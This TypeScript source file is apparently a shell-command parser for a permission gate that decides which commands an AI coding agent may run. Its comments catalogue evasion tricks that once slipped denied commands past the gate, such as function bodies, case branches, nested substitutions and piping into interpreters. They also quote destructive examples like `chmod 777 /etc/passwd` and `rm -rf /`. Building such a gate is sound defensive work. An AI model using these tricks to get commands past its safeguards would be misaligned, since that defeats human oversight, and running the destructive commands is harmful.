        subshellIds.push(++SUBSHELL_SEQ);
        groupStack.push(++groupSeq);
        // a keyword that introduced the group is structure too: pushing `time` or `if` as its own segment made it
        // an unknown command
        if (cur.trim()) cur = '';
        i++;
        continue;
      }
      if (ch === ')' && subshell > 0) {
        push();
        subshell--;
        subshellIds.pop();
        groupStack.pop();
        if (subshell === 0 && segments.slice(subshellStart).some((sg) => directoryChange(sg.text) !== null))
          segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
        i++;
        continue;
      }
      // A FUNCTION DEFINITION IS STRUCTURE, AND ITS BODY IS COMMANDS. `f() { chmod 777 /etc/passwd; }; f` kept the
      // header glued to the first command, so the head was `f()` and every head-anchored classification missed —
      // an absolute core deny reached ASK, at any producer depth (exit review 4). The header is discarded; the
      // body is split like any other group.
      if ((ch === '{' || ch === '(') && atFunctionBody()) {
        // The header is not a command — but it IS a BINDING: the name it declares re-points every later use in
        // this unit. Discarding it outright lost that, so the marker carries the name to the binding dimension
        // while nothing classifies it as a program.
        const declared = /([A-Za-z_][A-Za-z0-9_:.-]*)\s*(?:\(\s*\))?$/.exec(cur.trim());
        // ...and NOT inside a `case` branch, where the splitter has already swallowed the pattern list so no
        // segment says `case` any more. A definition there binds nothing unless that branch is the one taken
        // (exit review 8).
        if (declared && caseDepth === 0)
          segments.push({ text: `${FUNCTION_DEF_PREFIX} ${declared[1]}`, pipedFromPrevious: false });
        cur = '';
        groupStack.push(++groupSeq);
        if (declared && caseDepth === 0) functionBodyGroups.set(groupSeq, declared[1]!);
        if (ch === '(') {
          if (subshell === 0) subshellStart = segments.length;
          subshell++;
          subshellIds.push(++SUBSHELL_SEQ);
        }
        i++;
        continue;
      }
      if (ch === '{' && atCommandStart() && (next === ' ' || next === '\t' || next === '\n')) {
        if (cur.trim()) cur = '';
        groupStack.push(++groupSeq);
        i++;
        continue;
      }
      if (ch === '}' && cur.trim() === '') {
        const closed = groupStack.pop();
        if (closed !== undefined && functionBodyGroups.has(closed)) {
          segments.push({ text: FUNCTION_BODY_END, pipedFromPrevious: false });
          lastFnDefEnd = { name: functionBodyGroups.get(closed)!, at: segments.length };
        }
        i++;
        continue;
      }
      // A `case` BRANCH IS A COMMAND, AND ITS PATTERN LIST IS NOT. The pattern stayed inside the segment, so the
      // head was `case` or the pattern word and every head-dependent classification missed: in
      // `case $x in a) chmod 777 /etc/passwd ;; esac` the path was read as an ARGUMENT — an ASK — where the same
      // command alone writes /etc/passwd and is DENY (exit review 4). The pattern list is discarded; `case … in`
      // is recognised whether the branch is on that line or below it, and a `)` that closes something else — an
      // array assignment inside a branch — is left alone by the shape guard.
      if (ch === ')') {
        const pending = cur.trim();
        if (/^case\s+\S+\s+in(\s|$)/.test(pending)) {
          caseDepth++;
          cur = '';
          i++;
          continue;
        }
        if (caseDepth > 0 && /^\(?\s*[^\s()|;&]*$/.test(pending)) {
          cur = '';
          i++;
          continue;
        }
      }
    }
    // COMMAND SUBSTITUTION IS SUPPRESSED BY SINGLE QUOTES ONLY. Double quotes stop the shell from SPLITTING on
    // operators, and stop nothing else: `echo "$(git push origin main)"` runs the push. Guarding the extractor
    // with `!inDouble` alongside the operator branches dropped an entire execution channel — every DENY in the
    // control plane was reachable through it in one Bash call, at ALLOW, which on claude-code suppresses the
    // host's own prompt (exit review 3).
    if (!inSingle) {
      // ARITHMETIC EXPANSION RUNS NO COMMAND — BUT `$((` IS NOT ENOUGH TO RECOGNISE IT. `$((cmd) )` and
      // `$((cmd); true)` are COMMAND SUBSTITUTIONS of a subshell in bash, zsh and dash: verified against real
      // shells, they run `cmd`. Treating every `$((` as arithmetic therefore erased the command entirely and every
      // DENY in the control plane became ALLOW through it — a regression this branch introduced and exit review 4
      // found. A shell resolves the ambiguity by requiring the span to CLOSE with `))`; when it does not, it
      // re-parses as `$( (…) …)`. So does this: arithmetic only when the two closing parens are adjacent.
      // ...and a body carrying a shell OPERATOR is not arithmetic in any shell: `$((:) && (git push origin
      // main))` is a command substitution containing two subshells (exit review 8).
      if (
        ch === '$' &&
        next === '(' &&
        command[i + 2] === '(' &&
        // ...and only when the BODY could be arithmetic: a shell operator anywhere before the closing `))` means
        // this is a command substitution containing subshells, which is what `$((:) && (git push …))` is
        !/[;&|]/.test(command.slice(i + 3, (command.indexOf('))', i + 3) + 2) || command.length))
      ) {
        let depth = 0;
        let j = i + 1;
        let inner = '';
        let prevClose = false; // true when the character before the closing paren was itself `)`
        while (j < command.length) {
          const c = command[j]!;
          if (c === '(') depth++;
          else if (c === ')') depth--;
          if (depth === 0) {
            prevClose = command[j - 1] === ')';
            break;
          }
          if (!(depth === 1 && c === '(')) inner += c;
          j++;
        }
        if (prevClose) {
          // the expression itself is never executed, so only the commands SUBSTITUTED INTO it are segments: the
          // arithmetic remainder that carries their output (`$SUBST + 1`) is a number here, not a command
          if (/\$\(|`/.test(inner))
            for (const sg of splitShellPipeline(inner)) if (!/^\$SUBST\b/.test(sg.text)) segments.push(sg);
          cur += '$ARITH';
          i = j + 1;
          continue;
        }
        // not arithmetic: fall through to the command-substitution branch below, which reads `$( … )`
      }
      if ((ch === '$' || ch === '<' || ch === '>') && next === '(') {
        if (ch === '<' || ch === '>') sawProcessSubstitution = true;
        // command or process substitution: capture the inner command as its own segment and keep scanning. Where it
        // ENDS is decided by scanSubstitutionBody - quotes, comments, `${…}`, ANSI-C strings and `case` patterns
        // included - and not by counting parentheses (exit review 10)
        const close = scanSubstitutionBody(command, i + 2);
        const inner = command.slice(i + 2, close < 0 ? command.length : close);
        const j = close < 0 ? command.length : close + 1;
        const innerSegments = splitShellPipeline(inner);
        {
          // one shell for the whole substitution body: a `cd` in it reaches the later stages of the body and nothing else
          const id = ++SUBSHELL_SEQ;
          for (const s of innerSegments)
            segments.push({ ...s, inSubshell: true, subshellPath: [...subshellIds, id, ...(s.subshellPath ?? [])] });
        }
        // A COMMAND SUBSTITUTION RUNS IN A SUBSHELL, so a `cd` in it does not move the caller either — the same
        // rule as `( )`, and without it `echo "$(cd sub && pwd)" && make build` resolved the CALLER's make against
        // sub/ (exit review 4).
        if (innerSegments.some((sg) => directoryChange(sg.text) !== null))
          segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
        // ...and a DEFINITION in it binds nothing in the caller either, for exactly the same reason
        for (const sg of innerSegments)
          if (sg.text.startsWith(`${FUNCTION_DEF_PREFIX} `))
            segments.push({
              text: `${FUNCTION_UNBIND} ${sg.text.slice(FUNCTION_DEF_PREFIX.length + 1)}`,
              pipedFromPrevious: false,
            });
        // the placeholder stands INSIDE the word the substitution was part of. Separating it with a space made
        // `TODAY=$(date +%F)` read as the assignment `TODAY=` followed by a command whose head is a substitution,
        // so the most ordinary line in any script was opaque (exit review 4).
        cur += '$SUBST';
        i = j;
        continue;
      }
      if (ch === '`') {
        // A NESTED BACKTICK IS ESCAPED, and the inner pair is the one that runs LAST. POSIX nests backticks by
        // writing the inner ones as `\``, so the FIRST unescaped backtick after this one closes the outer
        // substitution — `indexOf` found the escaped one instead and cut the body in half, which hid the inner
        // command entirely (exit review 8). The body then has its escapes removed, because that is what the
        // shell hands to the inner parse.
        let end = -1;
        for (let k = i + 1; k < command.length; k++) {
          if (command[k] === '\\') {
            k++;
            continue;
          }
          if (command[k] === '`') {
            end = k;
            break;
          }
        }
        if (end > i) {
          const backticked = splitShellPipeline(command.slice(i + 1, end).replace(/\\([`$\\])/g, '$1'));
          {
            const id = ++SUBSHELL_SEQ;
            for (const s of backticked)
              segments.push({ ...s, inSubshell: true, subshellPath: [...subshellIds, id, ...(s.subshellPath ?? [])] });
          }
          if (backticked.some((sg) => directoryChange(sg.text) !== null))
            segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
          cur += '$SUBST';
          i = end + 1;
          continue;
        }
      }
    }
    cur += ch;
    i++;
  }
  push();
  return segments;
}

/* ------------------------------------------------------------------------------------------------------------- *
 * ONE LEXER FOR THE BODY OF `$( … )`.
 *
 * Three scanners counted parentheses for three callers, each with its own idea of what hides one: the splitter knew
 * quotes and `case`, the heredoc extractor knew neither, and none knew that a `)` can sit inside a comment, a `${…}`
 * expansion, an ANSI-C string, a nested substitution's own quoting, or a `case` pattern after a subject that contains a
 * space (exit review 10, self-attack: five findings, one cause). A substitution that ends early leaves the rest of its
 * body as TEXT, which is how `git push origin main` inside one became invisible. This reads the body the way the
 * shell does and returns where it really ends.
 * ------------------------------------------------------------------------------------------------------------- */
function skipSingleQuoted(t: string, i: number): number {
  const e = t.indexOf("'", i);
  return e < 0 ? -1 : e + 1;
}
function skipAnsiC(t: string, i: number): number {
  for (; i < t.length; i++) {
    if (t[i] === '\\') i++;
    else if (t[i] === "'") return i + 1;
  }
  return -1;
}
function skipBacktickSpan(t: string, i: number): number {
  for (; i < t.length; i++) {
    if (t[i] === '\\') i++;
    else if (t[i] === '`') return i + 1;
  }
  return -1;
}
function skipDoubleQuoted(t: string, i: number): number {
  while (i < t.length) {
    const c = t[i]!;
    if (c === '\\') i += 2;
    else if (c === '"') return i + 1;
    else if (c === '`') {
      i = skipBacktickSpan(t, i + 1);
      if (i < 0) return -1;
    } else if (c === '$' && t[i + 1] === '(') {
      const e = scanSubstitutionBody(t, i + 2);
      if (e < 0) return -1;
      i = e + 1;
    } else if (c === '$' && t[i + 1] === '{') {
      i = skipParameterExpansion(t, i + 2);
      if (i < 0) return -1;
    } else i++;
  }
  return -1;
}
/** after `${`: to just past the matching `}` */
function skipParameterExpansion(t: string, i: number): number {
  while (i < t.length) {
    const c = t[i]!;
    if (c === '\\') i += 2;
    else if (c === '}') return i + 1;
    else if (c === "'") {
      i = skipSingleQuoted(t, i + 1);
      if (i < 0) return -1;
    } else if (c === '"') {
      i = skipDoubleQuoted(t, i + 1);
      if (i < 0) return -1;
    } else if (c === '`') {
      i = skipBacktickSpan(t, i + 1);
      if (i < 0) return -1;
    } else if (c === '$' && t[i + 1] === '(') {
      const e = scanSubstitutionBody(t, i + 2);
      if (e < 0) return -1;
      i = e + 1;
    } else if (c === '$' && t[i + 1] === '{') {
      i = skipParameterExpansion(t, i + 2);
      if (i < 0) return -1;
    } else i++;
  }
  return -1;
}
/** One shell WORD starting at `i`: quotes and expansions inside it are part of it. Returns its end (exclusive). */
function skipWordAt(t: string, i: number): number {
  while (i < t.length) {
    const c = t[i]!;
    if (/[\s;&|()<>]/.test(c)) return i;
    if (c === '\\') i += 2;
    else if (c === "'") {
      i = skipSingleQuoted(t, i + 1);
      if (i < 0) return t.length;
    } else if (c === '"') {
      i = skipDoubleQuoted(t, i + 1);
      if (i < 0) return t.length;
    } else if (c === '`') {
      i = skipBacktickSpan(t, i + 1);
      if (i < 0) return t.length;
    } else if (c === '$' && t[i + 1] === "'") {
      i = skipAnsiC(t, i + 2);
      if (i < 0) return t.length;
    } else if (c === '$' && t[i + 1] === '(') {
      const e = scanSubstitutionBody(t, i + 2);
      if (e < 0) return t.length;
      i = e + 1;
    } else if (c === '$' && t[i + 1] === '{') {
      i = skipParameterExpansion(t, i + 2);
      if (i < 0) return t.length;
    } else i++;
  }
  return i;
}
/** `i` is just after `$(`. Returns the index of the `)` that ends the substitution, or -1 when it never does. */
function scanSubstitutionBody(t: string, i: number): number {
  let depth = 1;
  /** open `case`s: the paren depth each opened at, and whether a PATTERN is what the scanner is reading */
  const cases: Array<{ depth: number; pattern: boolean }> = [];
  let cmdStart = true;
  while (i < t.length) {
    const c = t[i]!;
    if (c === '\\') {
      i += 2;
      cmdStart = false;
      continue;
    }
    if (c === "'" || c === '"' || c === '`' || c === '$') {
      // any word that begins with a quote or an expansion is read whole, so nothing inside it is structure
      const e = skipWordAt(t, i);
      if (e === i) {
        i++;
        continue;
      }
      i = e;
      cmdStart = false;
      continue;
    }
    if (c === '#' && (i === 0 || /[\s;&|(]/.test(t[i - 1]!))) {
      const nl = t.indexOf('\n', i);
      i = nl < 0 ? t.length : nl;
      continue;
    }
    const top = cases[cases.length - 1];
    if (c === '(') {
      // a pattern may be written `(a|b)`: that paren opens nothing
      if (top && top.depth === depth && top.pattern) {
        i++;
        continue;
      }
      depth++;
      i++;
      cmdStart = true;
      continue;
    }
    if (c === ')') {
      if (top && top.depth === depth && top.pattern) {
        top.pattern = false;
        i++;
        cmdStart = true;
        continue;
      }
      depth--;
      if (depth === 0) return i;
      i++;
      cmdStart = false;
      continue;
    }
    if (c === ';') {
      if ((t[i + 1] === ';' || t[i + 1] === '&') && top && top.depth === depth) {
        top.pattern = true;
        i += t[i + 1] === ';' && t[i + 2] === '&' ? 3 : 2;
      } else i++;
      cmdStart = true;
      continue;
    }
    if (c === '&' || c === '|' || c === '\n') {
      i++;
      cmdStart = true;
      continue;
    }
    if (/\s/.test(c)) {
      i++;
      continue;
    }
    const e = skipWordAt(t, i);
    const w = t.slice(i, e);
    const inPattern = top !== undefined && top.depth === depth && top.pattern;
    if (cmdStart && !inPattern && w === 'case') {
      // `case SUBJECT in` - the subject is any word, spaces inside its quotes and expansions included
      let j = e;
      while (j < t.length && /\s/.test(t[j]!)) j++;
      const subjectEnd = skipWordAt(t, j);
      let k = subjectEnd;
      while (k < t.length && /\s/.test(t[k]!)) k++;
      const kwEnd = skipWordAt(t, k);
      if (subjectEnd > j && t.slice(k, kwEnd) === 'in') {
        cases.push({ depth, pattern: true });
        i = kwEnd;
        cmdStart = false;
        continue;
      }
    }
    if (cmdStart && !inPattern && w === 'esac' && top && top.depth === depth) {
      cases.pop();
      i = e;
      cmdStart = false;
      continue;
    }
    i = Math.max(e, i + 1);
    cmdStart = !inPattern && /^(do|then|else|elif|if|while|until|time|!|\{|\})$/.test(w);
  }
  return -1;
}

/** The commands SUBSTITUTED into a text: the inner command of every `$( )` and backtick span outside single
 *  quotes. Used for an UNQUOTED heredoc body, where the shell expands substitutions but the prose around them is
 *  data — `git push origin main` written in a release note is not a push. */
function substitutionsIn(text: string): string[] {
  const out: string[] = [];
  // THERE IS NO QUOTING INSIDE A HEREDOC BODY. `'` and `"` are ordinary characters there, so a scanner that
  // tracked them skipped the substitutions that the shell does expand (exit review 4). Only the backslash escape
  // survives, and only before `$`, `` ` `` and `\`.
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    if (ch === '\\') {
      i++;
      continue;
    }
    if (ch === '$' && text[i + 1] === '(' && text[i + 2] === '(') {
      // `$((…))` closing with ADJACENT parens is arithmetic and runs nothing; anything else is `$( (…) …)`
      let d = 0;
      let j = i + 1;
      let prevClose = false;
      for (; j < text.length; j++) {
        if (text[j] === '(') d++;
        else if (text[j] === ')' && --d === 0) {
          prevClose = text[j - 1] === ')';
          break;
        }
      }
      if (prevClose) {
        for (const nested of substitutionsIn(text.slice(i + 3, j - 1))) out.push(nested);
        i = j;
        continue;
      }
      out.push(text.slice(i + 2, j));
      i = j;
      continue;
    }
    if (ch === '$' && text[i + 1] === '(') {
      const close = scanSubstitutionBody(text, i + 2);
      const end = close < 0 ? text.length : close;
      out.push(text.slice(i + 2, end));
      i = end;
      continue;
    }
    if (ch === '`') {
      // POSIX nests backticks by escaping the inner pair, so the closing one is the first UNESCAPED backtick
      const after = skipBacktickSpan(text, i + 1);
      if (after > i) {
        out.push(text.slice(i + 1, after - 1).replace(/\\([`$\\])/g, '$1'));
        i = after - 1;
      }
    }
  }
  return out;
}

/** Heads that take their SCRIPT from standard input when nothing else names one. */
const STDIN_SCRIPT_HEAD_RE = /^((?:ba|z|da|k|a)?sh|fish|python|python2|python3|ruby|perl|node|nodejs|php|Rscript)$/;
/** Stages that copy standard input to standard output unchanged. `tee` also writes files — those are classified
 *  on the segment itself; what matters here is that what comes OUT is what went IN. `head`/`tail` truncate and are
 *  deliberately absent: the literal that survives them is not the literal that went in. */
const PASS_THROUGH_RE = /^(?:cat|tee(?:\s+(?:-[aip]+|[^-\s]\S*))*)\s*$/;
/** Heads that RUN a file they are given: the interpreters, plus `source` and `.`, which run it in the CURRENT
 *  shell. `. <(echo CMD)` is the same execution edge as `bash <(echo CMD)` and was missed because the gate listed
 *  only the interpreters (exit review 6). */
const RUNS_A_FILE_RE = /^((?:ba|z|da|k|a)?sh|fish|python|python2|python3|ruby|perl|node|nodejs|php|Rscript|source|\.)$/;
/** the file names that mean "standard input" */
const STDIN_FILE_RE = /^(?:\/dev\/stdin|\/dev\/fd\/0|\/proc\/self\/fd\/0)$/;
/** heads whose operand is a script run in the CURRENT shell */
/** options that name the script INLINE or as a module: stdin is then data, not the program */
const INLINE_SCRIPT_FLAG_RE = /^(-c|-e|-E|--eval|--command|-m|--module|-p|--print|-r|--require|-i)$/;
/** options of those heads that consume the next token, so their value is not mistaken for a script operand.
 *  `bash -o pipefail -c CMD` and `bash -O extglob -c CMD` read `pipefail`/`extglob` as the program and lost the
 *  inline script entirely (exit review 6). */
const STDIN_HEAD_VALUE_FLAG_RE = /^([-+][a-zA-Z]*[oO]|--rcfile|--init-file|-X|-W|-Q|--conf|--check-prefix)$/;

/** True when this command runs whatever is fed to its standard input: `sh`, `bash -s`, `python3 -`, `node`.
 *  A script operand, or an inline `-c`/`-e`/`-m` program, means stdin is DATA and this is false. */
export function readsScriptFromStdin(segment: string): boolean {
  const tokens = tokenize(segment);
  const raw = tokens[0] ?? '';
  const head = raw.slice(raw.lastIndexOf('/') + 1);
  // `source FILE` / `. FILE` runs FILE in the CURRENT shell, and /dev/stdin names the pipe: `echo CMD | . /dev/stdin`
  // really executes CMD (exit review 5).
  if (head === 'source' || head === '.') return tokens.slice(1).some((t) => STDIN_FILE_RE.test(t));
  // A DATABASE CLIENT WITH NO STATEMENT FLAG READS ITS SCRIPT FROM STANDARD INPUT, and that script can
  // re-target the session with a `\c` before it does anything else (exit review 8).
  if (DB_CLIENT_HEADS.has(head))
    return !tokens.slice(1).some((t) => /^(-c|--command|-e|--execute|--eval|-f|--file|--query)/.test(t));
  if (!STDIN_SCRIPT_HEAD_RE.test(head)) return false;
  const shellFamily = /^(?:ba|z|da|k|a)?sh$/.test(head);
  const rest = tokens.slice(1);
  for (let i = 0; i < rest.length; i++) {
    const t = rest[i]!;
    // A REDIRECTION IS NOT AN OPERAND. `bash 2>&1` and `bash > log` still read their program from stdin, and
    // reading the redirection as the script name answered false for both (exit review 4). An INPUT redirection is
    // the opposite: it REPLACES stdin, so the pipe edge is genuinely gone.
    // A HEREDOC OR HERESTRING IS THE STDIN SCRIPT ITSELF — `bash <<EOF` runs the body. A redirection from a FILE
    // is the opposite: it replaces stdin, so a pipe into it carries nothing and the file is the program.
    if (/^\d*<<-?/.test(t) || /^\d*<<</.test(t)) return true;
    // `<&0` DUPLICATES the descriptor stdin already has; only a redirection from a FILE replaces it, and reading
    // the duplication as a replacement dropped the pipe edge (exit review 6).
    if (/^\d*<&/.test(t)) continue;
    if (/^\d*</.test(t)) return false;
    if (/^(?:\d*(?:>>?|>&|>\|)|&>>?)/.test(t)) {
      if (/^(?:\d*(?:>>?|>&|>\|)|&>>?)$/.test(t)) i++; // a bare operator takes the next token as its target
      continue;
    }
    if (t === '-' || STDIN_FILE_RE.test(t)) return true; // explicitly THE stdin script
    // `-s` means "the script is on stdin" for the sh family only; for python and perl it is a different flag
    if (shellFamily && /^-[a-zA-Z]*s$/.test(t)) return true;
    // THE INLINE-SCRIPT FLAGS ARE NOT THE SAME FOR EVERY HEAD. For a shell only `-c` names a program; `-e`, `-E`,
    // `-i`, `-p`, `-r` and `-m` are ordinary shell options, and reading them as "an inline script" meant
    // `echo 'rm -rf /' | bash -e` lost the pipe edge entirely (exit review 5).
    if (
      (shellFamily ? /^-[a-zA-Z]*c$/.test(t) : INLINE_SCRIPT_FLAG_RE.test(t)) ||
      /^--(eval|command|module|print|require)=/.test(t)
    )
      return false;
    if (STDIN_HEAD_VALUE_FLAG_RE.test(t) || /^[-+][a-zA-Z]*[oO]$/.test(t)) {
      i++; // its value, never a script — `bash -euo pipefail` is not a script named pipefail
      continue;
    }
    if (t.startsWith('-') || t === '--') continue;
    return false; // a positional operand: THAT is the script
  }
  return true;
}

/** The exact text a command writes to standard output, or null when EGO cannot know it. Only a literal counts:
 *  an unquoted or double-quoted word carrying `$` or a backtick expands to something unknown, and guessing there
 *  would be the unearned positive claim this kernel exists to refuse. */
export function literalStdout(segment: string, heredoc?: { body: string; expanded: boolean }): string | null {
  // a heredoc BODY is the opener's standard output: verbatim when the delimiter was quoted, and — by the same
  // rule as any other word — only when nothing in it expands if the delimiter was not
  if (heredoc) return heredoc.expanded && /[$`]/.test(heredoc.body) ? null : heredoc.body;
  const trimmed = emitterTail(segment).replace(/^(?:\S*\/)(echo|printf|cat)(?=\s|$)/, '$1');
  const here = /^cat\s+<<<\s*(.+)$/.exec(trimmed);
  if (here) return literalWord(here[1]!.trim());
  const printf = /^printf\s+(?:--\s+)?([\s\S]+)$/.exec(trimmed);
  if (printf) {
    const words = splitWords(printf[1]!);
    const format = literalWord(words[0] ?? '');
    if (format === null) return null;
    // with no arguments the FORMAT is the output, provided it carries no conversion and no escape but `\n`
    if (words.length === 1) return /%/.test(format) ? null : decodeEscapes(format);
    if (!/^%[sb](\\n)?$/.test(format)) return null; // a multi-conversion format is not a literal
    const parts: string[] = [];
    for (const w of words.slice(1)) {
      const lit = literalWord(w);
      if (lit === null) return null;
      parts.push(lit);
    }
    // the format's own escapes are real: `printf '%s\\n' a b` writes two LINES, not one word
    return parts.map((v) => decodeEscapes(format.replace(/%[sb]/, () => v))).join('');
  }
  const echo = /^echo\b((?:\s+-[neE]+)*)\s+([\s\S]+)$/.exec(trimmed);
  if (!echo) return null;
  const parts: string[] = [];
  for (const word of splitWords(echo[2]!)) {
    const lit = literalWord(word);
    if (lit === null) return null;
    parts.push(lit);
  }
  if (!parts.length) return null;
  const joined = parts.join(' ');
  // `-e` turns the backslash escapes ON, and `-E` off; without either, /bin/sh's echo interprets them and bash's
  // does not. Decoding whenever a backslash is present is the FAIL-SAFE reading: it can only reveal more commands.
  return /-[neE]*e/.test(echo[1] ?? '') || (!/-[neE]*E/.test(echo[1] ?? '') && /\\/.test(joined))
    ? decodeEscapes(joined)
    : joined;
}

/** The command inside a stage, with the shell keywords, leading assignments and transparent wrappers sliced off
 *  VERBATIM. The normalizer would do more — but it also DE-QUOTES, and after that `'$X'` and `"$X"` read alike
 *  although only the first is a literal, so the upstream of a pipe is trimmed rather than normalized. */
export function emitterTail(text: string): string {
  let out = text.trim();
  for (;;) {
    const before = out;
    out = out.replace(/^(?:if|then|else|elif|while|until|do|!|time|coproc)\s+/, '');
    out = out.replace(/^[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|'[^']*'|\S*)\s+/, '');
    out = out.replace(/^(?:command|builtin|exec|env|nohup|stdbuf\s+-\S+|nice(?:\s+-n\s+\S+)?|timeout\s+\S+)\s+/, '');
    if (out === before) return out;
  }
}

/** The bytes a backslash escape stands for. `echo -e 'a\\nrm -rf /'` writes TWO LINES, so reading the text back
 *  with the backslash intact glued two commands into one word and produced a POSITIVE claim that was wrong —
 *  worse than opacity, because it is asserted rather than admitted (exit review 5). */
function decodeEscapes(text: string): string {
  // the NUMERIC escapes too: `\x20`, `\0101` and `\u0041` are ordinary characters in `echo -e` and `printf %b`,
  // and leaving them encoded asserted a literal that was not the text the shell would receive (exit review 6)
  text = text
    .replace(/\\x([0-9a-fA-F]{1,2})/g, (_m, h: string) => String.fromCharCode(parseInt(h, 16) & 0xff))
    // `\0440` is `\0` + three octal digits = 288, which `printf %b` masks to a byte (32, a space); leaving it at
    // 288 produced a character no shell would see and split the word in the wrong place
    .replace(/\\0([0-7]{1,3})/g, (_m, o: string) => String.fromCharCode(parseInt(o, 8) & 0xff))
    .replace(/\\u([0-9a-fA-F]{4})/g, (_m, h: string) => String.fromCharCode(parseInt(h, 16)));
  return text.replace(/\\(n|t|r|a|b|f|v|e|\\)/g, (_m, c: string) =>
    c === 'n' ? '\n' : c === 't' ? '\t' : c === 'r' ? '\r' : c === 'f' ? '\f' : c === 'v' ? '\v' : c === 'b' ? '\b' : c === '\\' ? '\\' : '\x1b',
  );
}

/** A single word's literal value: single quotes are exact, double quotes and bare words only when inert. */
function literalWord(word: string): string | null {
  const single = /^'([^']*)'$/.exec(word);
  if (single) return single[1]!;
  const double = /^"([^"]*)"$/.exec(word);
  const body = double ? double[1]! : word;
  if (/[$`]/.test(body)) return null; // it expands: the real output is not this text
  return body;
}

/** Splits a word list on unquoted whitespace, keeping each word's quotes so `literalWord` can judge them. */
function splitWords(s: string): string[] {
  const out: string[] = [];
  let cur = '';
  let quote: string | null = null;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    if (quote) {
      cur += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      cur += ch;
      continue;
    }
    if (IFS_RE.test(ch)) {
      if (cur) out.push(cutAtNul(cur));
      cur = '';
      continue;
    }
    cur += ch;
  }
  if (cur) out.push(cur);
  return out;
}

/** The segment TEXTS of a command. Everything that only needs to know WHICH commands run keeps using this; the
 *  pipeline edges are for the analyzer, which is the one place that has to model how they connect. */
export function splitShellSegments(command: string): string[] {
  return splitShellPipeline(command).map((stage) => stage.text);
}

/** Strips leading env assignments and transparent wrappers; expands `bash -c '...'` and `xargs` into inner commands. */
/** The command string carried by `su`/`runuser`/`flock`, in every spelling that runs it: `-c CMD`, `--command CMD`,
 *  `--command=CMD`, `--session-command=CMD`. Returns null when the wrapper carries no inline command. */
function operandWrapperBody(tokens: string[], from: number): string | null {
  for (let i = from + 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    // `--comm=`, `--sess=` … : any unambiguous abbreviation, and the body may be GLUED to a short cluster
    if (/^--(com|ses|sess)/.test(t) && !t.includes('=')) return tokens[i + 1] ?? null;
    if (/^-[a-zA-Z]*c$/.test(t)) return tokens[i + 1] ?? null;
    const glued = /^-[a-zA-Z]*c([\s\S]+)$/.exec(t);
    if (glued && !t.startsWith('--')) return glued[1]!;
    const m = /^--(?:com|ses|sess)[a-z-]*=([\s\S]*)$/.exec(t);
    if (m) return m[1]!;
  }
  return null;
}

/** THE CLIs THAT PRINT HELP BEFORE THEY DO ANYTHING, and the verbs on them that hand their remaining arguments to
 *  ANOTHER program. `git push --help` opens the manual and transmits nothing; `docker run IMG cmd --help` runs
 *  `cmd --help` in a container, and `sh -c BODY --help` makes `--help` the shell's `$0`. The first family is a
 *  probe; the second must never be read as one. */
const HELP_FIRST_CLIS = /^(git|gh|glab|aws|gcloud|az|kubectl|oc|helm|argocd|flux|terraform|tofu|pulumi|docker|podman|nerdctl)$/;
const ARGV_CARRYING_VERBS = /^(run|exec|create|start|attach|cp|debug|port-forward|proxy|plugin|kustomize)$/;

/** Returns the head when this segment is a HELP PROBE: the tool is asked for its manual and performs nothing.
 *
 *  A refusal of `git push --help` is an absolute deny over an act that changes nothing, which is the one verdict a
 *  human cannot approve (exit review 10: thirty findings, one cause). But `--help` is an exception that can hide
 *  the act, so it is a claim about the WHOLE line and is granted only where the position proves it:
 *    - it is the LAST word, so no other argument follows that the tool could be reading;
 *    - it is not the VALUE of an option — the word before it is a positional, never an option, because
 *      `git push -o --help origin main` pushes with a push-option of `--help`;
 *    - no `--` precedes it, after which everything belongs to another program;
 *    - the verb is not one that carries its arguments to a container or a cluster;
 *    - it was written UNQUOTED, so `--description 'run --help first'` is a value and not a flag.
 *  `-h` is a help flag for git only: for psql and mysql it is `--host`. */
/** THE OPTIONS EACH CLI PUTS BEFORE ITS VERB, and whether they take a value. The verb is the first bare word, and a
 *  bare word that is really an option's VALUE (`docker --context production run …`) names the wrong verb. An option this
 *  table does not know has an arity nobody can tell, so the position of the verb is unknown and nothing that rests on it
 *  may be granted (exit review 10, self-attack: `docker --context production run alpine ./deploy.sh --help`). */
const GLOBAL_OPTIONS: Record<string, { value: RegExp; bool: RegExp }> = {
  kubectl: {
    value: /^(--context|--cluster|--user|--namespace|-n|--kubeconfig|--server|-s|--token|--as|--as-group|--as-uid|--request-timeout|--certificate-authority|--client-certificate|--client-key|--cache-dir|--username|--password|--tls-server-name|-v|--v|--vmodule|--profile|--profile-output|--log-flush-frequency)$/,
    bool: /^(--insecure-skip-tls-verify|--warnings-as-errors|--disable-compression|--match-server-version)$/,
  },
  helm: {
    value: /^(--kube-context|--kubeconfig|-n|--namespace|--kube-apiserver|--kube-token|--kube-as-user|--kube-as-group|--kube-ca-file|--kube-tls-server-name|--registry-config|--repository-cache|--repository-config|--burst-limit)$/,
    bool: /^(--debug|--kube-insecure-skip-tls-verify)$/,
  },
  docker: {
    value: /^(--context|-c|--config|-H|--host|-l|--log-level|--tlscacert|--tlscert|--tlskey|--connection|--url|--identity)$/,
    bool: /^(--debug|-D|--tls|--tlsverify)$/,
  },
  git: {
    value: /^(-C|-c|--git-dir|--work-tree|--namespace|--super-prefix|--config-env|--exec-path)$/,
    bool: /^(--no-pager|-p|--paginate|-P|--bare|--no-replace-objects|--literal-pathspecs|--glob-pathspecs|--noglob-pathspecs|--icase-pathspecs|--no-optional-locks|--no-lazy-fetch)$/,
  },
  aws: {
    value: /^(--profile|--region|--endpoint-url|--output|--query|--ca-bundle|--cli-connect-timeout|--cli-read-timeout)$/,
    bool: /^(--debug|--no-verify-ssl|--no-paginate|--no-sign-request|--no-cli-pager|--no-cli-auto-prompt)$/,
  },
  gcloud: {
    value: /^(--project|--account|--configuration|--impersonate-service-account|--billing-project|--verbosity|--format)$/,
    bool: /^(--quiet|-q|--no-user-output-enabled)$/,
  },
};
GLOBAL_OPTIONS['oc'] = GLOBAL_OPTIONS['kubectl']!;
GLOBAL_OPTIONS['podman'] = GLOBAL_OPTIONS['docker']!;
GLOBAL_OPTIONS['nerdctl'] = GLOBAL_OPTIONS['docker']!;

